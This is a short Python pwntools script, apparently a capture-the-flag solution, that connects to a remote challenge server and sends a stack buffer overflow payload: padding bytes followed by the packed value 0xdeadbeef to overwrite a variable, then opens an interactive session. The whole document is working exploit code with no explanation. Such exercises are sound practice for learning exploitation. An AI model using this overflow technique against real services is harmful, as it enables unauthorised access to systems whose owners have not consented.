#!/usr/bin/python 
from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3000)

p.sendline('A'*(0x34-0xc) + p32(0xdeadbeef))

p.interactive()
